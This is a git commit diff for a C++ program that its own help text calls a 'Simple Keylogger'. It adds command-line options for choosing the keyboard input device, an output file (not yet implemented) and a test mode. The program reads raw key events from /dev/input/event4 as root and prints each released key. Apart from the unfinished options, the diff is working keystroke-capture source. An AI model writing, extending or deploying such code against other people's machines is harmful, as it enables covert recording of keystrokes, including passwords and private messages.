290d28c8b74eb47f2143f2ddcd95b58b850c84c8
andreiutu suare <aosxap@gmail.com>
2021-12-05 04:23:07 +0200

    added few options commit

--- main.cpp
+++ main.cpp
@@ -10,26 +10,53 @@
 #define RD O_RDONLY
 #define INF 1
 
+int main(int argc, char **argv){
+	char dev[100] = "/dev/input/event4";
+	int test_mode = 0;
+	
+	for(int i = 1; i < argc; i+=2){
 
-int main(){
-	const char* dev = "/dev/input/event4";
+		if(strcmp(argv[i], "--help") == 0)
+			std::cout<<"Simple Keylogger help panel - don't forget to run it as root \n\n\n"
+					 <<"-K {keyboard_event}	keyboard event(default is /dev/input/event4) \n"
+					 <<"-F {file_name}		specify a file where the output will be saved\n"
+					 <<"-t 			the program will run in test mode		\n\n\n";
+					 
+		else if(strcmp(argv[i], "-t") == 0){
+			test_mode = 1; break;		
+		}				 
+		
+		else if(strcmp(argv[i], "-K") == 0){
+			if(argv[i+1]){
+				strcpy(dev,argv[i+1]);
+				std::cout<<"dev changed into "<<dev<<"\n";
+			}else std::cout<<"error : no argument specified";
+			
+		}else if(strcmp(argv[i], "-F") == 0)
+			std::cout<<argv[i+1];
+			
+		else std::cout<<"unknown command";
+	}
+
 	int fd = open(dev, O_RDONLY);
 
 	struct input_event ev; 
 
-	helper::disable_echo();
+	if(test_mode){
+		helper::disable_echo();
 	
-	while(INF){
-		read(fd, &ev, sizeof(ev));
+		while(INF){
+			read(fd, &ev, sizeof(ev));
 
-		if((ev.type == EV_KEY) && (ev.value == 0)) 
-			std::cout<<helper::keycodes[ev.code]<<"\n";
+			if((ev.type == EV_KEY) && (ev.value == 0)) 
+				std::cout<<helper::keycodes[ev.code]<<"\n";
 
-		if(strcmp(helper::keycodes[ev.code], "ESC") == 0) break;
+			if(strcmp(helper::keycodes[ev.code], "ESC") == 0) break;
 		
-	}
+		}
 
-	helper::enable_echo();
+		helper::enable_echo();
+	}
 	//system("cancel && clear");
 	close(fd);
 }
